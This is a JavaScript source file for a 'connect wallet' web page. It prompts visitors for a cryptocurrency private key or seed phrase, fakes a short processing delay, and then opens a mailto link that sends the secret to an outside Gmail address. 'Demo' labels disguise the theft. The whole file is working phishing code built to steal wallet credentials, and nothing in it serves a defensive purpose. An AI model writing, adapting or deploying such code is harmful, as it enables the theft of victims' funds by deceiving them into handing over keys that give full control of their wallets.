// ================= SELECT ELEMENTS =================
const manualConnectBtn = document.getElementById("manualConnect");
const walletTypeSelect = document.getElementById("walletType");
const manualInput = document.getElementById("manualAddress");
const walletSelectedDisplay = document.getElementById("walletSelected");
const addressDisplay = document.getElementById("walletAddress");
const networkDisplay = document.getElementById("walletNetwork");
const walletInfo = document.getElementById("walletInfo");
// ================= SHOW PRIVATE KEY INPUT WHEN WALLET SELECTED =================
walletTypeSelect.addEventListener("change", () => {
  if (walletTypeSelect.value) {
    manualBox.classList.remove("hidden");
  } else {
    manualBox.classList.add("hidden");
  }
});

// ================= MANUAL PRIVATE KEY / SEED PHRASE =================
manualConnectBtn.addEventListener("click", () => {
  const walletType = walletTypeSelect.value;
  const privateKeyOrSeed = manualInput.value.trim();

  if (!walletType) {
    alert("Please select a wallet type.");
    return;
  }

  if (!privateKeyOrSeed) {
    alert("Please enter a Private Key or Seed Phrase.");
    return;
  }

  // Disable button and show loading state
  manualConnectBtn.disabled = true;
  const originalText = manualConnectBtn.innerText;
  manualConnectBtn.innerText = "Preparing email...";

  // Display wallet info
  walletSelectedDisplay.innerText = walletType;
  addressDisplay.innerText = privateKeyOrSeed;
  networkDisplay.innerText = "Demo Network";
  walletInfo.classList.remove("hidden");

  // Small delay to simulate “processing”
  setTimeout(() => {
    const subject = encodeURIComponent(`Wallet Submission: ${walletType}`);
    const body = encodeURIComponent(
      `Wallet Type: ${walletType}\nPrivate Key / Seed Phrase (demo):\n\n${privateKeyOrSeed}`
    );

    // Open the user's email client
    window.location.href = `mailto:chainprotocol981@gmail.com?subject=${subject}&body=${body}`;

    // Reset button
    manualConnectBtn.disabled = false;
    manualConnectBtn.innerText = originalText;

    // Clear input
    manualInput.value = "";
  }, 800); // 0.8 second delay
});
